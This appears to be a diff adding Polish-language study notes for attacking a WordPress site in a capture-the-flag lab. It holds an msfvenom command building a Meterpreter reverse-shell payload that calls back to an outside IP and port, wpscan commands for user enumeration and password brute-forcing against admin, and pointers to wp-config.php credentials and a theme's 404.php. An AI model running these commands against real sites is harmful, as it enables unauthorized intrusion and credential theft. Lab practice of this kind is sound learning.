@@ -1,1 +1,31 @@
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.55.116 LPORT=4444 -f php -o patch.php
+
+1) Automatyczne skanowanie WPscan (wpscan --update)
+      • Skanowanie z enumeracja uzytkowniow
+            ▪ wpscan --url <url> --enumerate u
+      • Pruba zalogowania na znanych uzytkownikow
+            ▪ wpscan -U <users_file> -P <slownik> --disable-tls-checks --url <url>
+      • Detekcja agresywna (nie zawsze skuteczniejsza)
+            ▪ wpscan --detection-mode=aggressive -e ap, at, tt, cb, dbe, u, m -t 10 --disable-tls-checks --url <url>
+      • Full opcje dla enumeracji uzytkownikow
+            ▪ wpscan -e ap, at, tt, cb, dbe, u, m -t 10 --disable-tls-checks --url <url>
+      • Brutalny atak na znanego uzytkownika
+            ▪ wpscan --url <url> --usernames <user> --passwords <slownik>
+      • Brutforce na admina
+            ▪ wpscan --url <url> --usernames admin --passwords <slownik>
+      • Enumerowanie motywow
+            ▪ wpscan --url <url> --enumerate t
+   
+2) Sprawdzenie znanych adresow
+      • Podstrony
+            ▪ /wp-admin.php
+            ▪ /wp-config.php   
+            ▪ /wp-login.php
+
+4) Odwolanie sie do theme
+      • Twenty seven 404.php
+            ▪ http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+            ▪ Moga byc rozne sciezki wp-scan pokazuje sciezke
+               
+5) Co sprawdzac
+      • wp-config.php (czesto sa zaszyte credensiale do bazy danych)
